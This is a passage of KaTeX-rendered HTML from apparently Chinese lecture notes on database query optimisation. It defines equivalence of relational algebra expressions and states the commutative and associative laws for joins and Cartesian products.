aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的同名变量带入相同的关系后产生相同的结果(影响几何)，则说<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是等价的，记为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1\equiv E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%93%AA%E4%BA%9B%E5%85%B3%E7%B3%BB%E6%93%8D%E4%BD%9C%E6%AC%A1%E5%BA%8F%E5%8F%AF%E4%BB%A5%E4%BA%A4%E6%8D%A2" tabindex="-1">（2）哪些关系操作次序可以交换</h4><h5 id="%E5%AE%9A%E7%90%86l1%EF%BC%9A%E8%BF%9E%E6%8E%A5%E4%B8%8E%E8%BF%9E%E6%8E%A5%EF%BC%8C%E7%A7%AF%E4%B8%8E%E7%A7%AF%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L1：连接与连接，积与积的交换律</h5><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><msub><mo>⋈</mo><mi>F</mi></msub><msub><mi>E</mi><mn>2</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>2</mn></msub><msub><mo>⋈</mo><mi>F</mi></msub><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1 \Join_F E_2\equiv E_2 \Join_F E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo>⋈</mo><msub><mi>E</mi><mn>2</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>2</mn></msub><mo>⋈</mo><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1 \Join E_2\equiv E_2 \Join E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>2</mn></msub><mo>×</mo><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1 \times E_2\equiv E_2\times E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ul><p>并，交运算也有交换律</p><h5 id="%E5%AE%9A%E7%90%86l2%EF%BC%9A%E5%AE%9A%E7%90%86l1%EF%BC%9A%E8%BF%9E%E6%8E%A5%E4%B8%8E%E8%BF%9E%E6%8E%A5%EF%BC%8C%E7%A7%AF%E4%B8%8E%E7%A7%AF%E7%9A%84%E7%BB%93%E5%90%88%E5%BE%8B" tabindex="-1">定理L2：定理L1：连接与连接，积与积的结合律</h5><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><msub><mo>⋈</mo><mrow><mi>F</mi><mn>1</mn></mrow></msub><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><msub><mo>⋈</mo><msub><mi>F</mi><mn>2</mn></msub></msub><msub><mi>E</mi><mn>3</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>1</mn></msub><msub><mo>⋈</mo><mrow><mi>F</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><msub><mo>⋈</mo><msub><mi>F</mi><mn>2</mn></msub></msub><msub><mi>E</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(E_1\Join_{F1}E_2)\Join_{F_2}E_3\equiv E_1\Join_{F1}(E_2\Join_{F_2}E_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>⋈</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>⋈</mo><msub><mi>E</mi><mn>3</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>1</mn></msub><mo>⋈</mo><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo>⋈</mo><msub><mi>E</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(E_1\Join E_2)\Join E_3\equiv E_1\Join (E_2\Join E_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>×</mo><msub><mi>E</mi><mn>3</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo>×</mo><msub><mi>E</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(E_1\times E_2)\times E_3\equiv E_1\times (E_2\times E_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span 